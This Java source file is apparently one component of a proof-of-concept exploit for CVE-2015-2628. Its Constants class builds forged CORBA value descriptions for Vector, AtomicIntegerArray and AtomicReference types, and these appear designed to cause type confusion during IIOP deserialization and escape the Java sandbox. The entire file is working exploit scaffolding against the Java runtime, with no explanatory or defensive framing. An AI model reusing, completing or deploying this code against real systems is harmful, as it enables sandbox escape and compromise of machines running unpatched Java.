package poc.cve_2015_2628;

import java.util.Collections;
import java.util.HashMap;
import java.util.Map;
import java.util.Vector;
import java.util.concurrent.atomic.AtomicIntegerArray;
import java.util.concurrent.atomic.AtomicReference;

import javax.rmi.CORBA.Util;
import javax.rmi.CORBA.ValueHandler;

import org.omg.CORBA.ORB;
import org.omg.CORBA.TCKind;
import org.omg.CORBA.ValueMember;

import com.sun.org.omg.CORBA.ValueDefPackage.FullValueDescription;

public class Constants {

	public static final ValueHandler V_HANDLER = Util.createValueHandler();
	
	public static final TypeCodeProxy TC_PROXY = new TypeCodeProxy( );
	
	// AtomicIntegerArray
	public static final String AIA_ID     = V_HANDLER.getRMIRepositoryID( AtomicIntegerArray.class );
	public static final String AIA_REF    = Constants.createRef( Constants.AIA_ID );
	
	// Vector
	public static final String VECTOR_ID  = V_HANDLER.getRMIRepositoryID( Vector.class );
	public static final String VECTOR_REF = Constants.createRef( Constants.VECTOR_ID );
	
	// AtomicReference
	public static final String ARB_ID     = V_HANDLER.getRMIRepositoryID( AtomicReference.class );
	public static final String ARB_REF    = Constants.createRef( Constants.ARB_ID );
	
	// AtomicReferenceChild
	public static final String ARC_ID     = V_HANDLER.getRMIRepositoryID( AtomicReferenceChild.class );
	public static final String ARC_REF    = Constants.createRef( Constants.ARC_ID );
	
	public static final Map< String, FullValueDescription > FV_DESCS   = Constants.getFVDescs( );
	
	private static String createRef( String s ) {
		int i = s.indexOf( ':', 4 );
		
		s = s.substring( 0, i ) + "_REF" + s.substring( i );
		
		return s;
	}
	
	private static Map< String, FullValueDescription > getFVDescs( ) {
		Map< String, FullValueDescription > descs = new HashMap< String, FullValueDescription >( );
		
		descs.put( Constants.VECTOR_REF, Constants.createDescForVector() );
		descs.put( Constants.AIA_REF, Constants.createDescForAIA() );
		
		descs.put( Constants.ARB_REF, Constants.createDescForARB() );
		descs.put( Constants.ARC_REF, Constants.createDescForARC() );
		
		return Collections.unmodifiableMap( descs );
	}
	
	
	
	private static FullValueDescription createDescForVector( ) {
		ValueMember[] members = {					
				new ValueMember( "elementData", "RMI:[Ljava.lang.Object;:.", "", "", Constants.TC_PROXY, null, ( short ) 0 ),
				new ValueMember( "elementCount", "", "", "", ORB.init().get_primitive_tc( TCKind.tk_long ) , null, ( short ) 0 ),
		};
		
		FullValueDescription desc = new FullValueDescription( );
		desc.name    = Vector.class.getName( );
		desc.id      = Constants.VECTOR_ID;
		desc.members = members;
		
		return desc;
	}
	
	private static FullValueDescription createDescForAIA( ) {
		ValueMember[] members = {
				new ValueMember( "array", "RMI:[I:.", "", "", Constants.TC_PROXY, null, ( short ) 0 )
		};
		
		FullValueDescription desc = new FullValueDescription( );
		desc.name    = AtomicIntegerArray.class.getName();
		desc.id      = Constants.AIA_ID;
		desc.members = members;
		
		return desc;
	}
	
	private static FullValueDescription createDescForARB( ) {
		ValueMember[] members = {
			new ValueMember( "value", "RMI:java.lang.Object:.", "", "", Constants.TC_PROXY, null, ( short ) 0 )
		};
		
		FullValueDescription desc = new FullValueDescription( );
		desc.name    = AtomicReference.class.getName();
		desc.id      = Constants.ARB_ID;
		desc.members = members;
		
		return desc;
	}
	
	private static FullValueDescription createDescForARC( ) {
		ValueMember[] members = { };
		
		FullValueDescription desc = new FullValueDescription( );
		
		desc.name       = AtomicReferenceChild.class.getName();
		desc.id         = Constants.ARC_ID;
		desc.members    = members;
		desc.base_value = Constants.ARB_REF;
		
		return desc;
	}
	
}
